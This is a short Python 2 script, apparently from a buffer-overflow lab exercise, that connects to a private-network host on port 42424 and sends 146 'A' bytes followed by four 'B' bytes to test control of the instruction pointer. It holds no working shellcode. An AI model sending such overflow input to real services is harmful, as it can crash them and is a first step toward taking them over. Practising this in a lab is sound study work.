#!/usr/bin/python2
import sys, socket

shellcode = "A" * 146 + "B" * 4

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.14.21',42424))
	s.send((shellcode + "\r\n"))
	s.close()

except:
	print ("Error connecting to server")
	sys.exit()
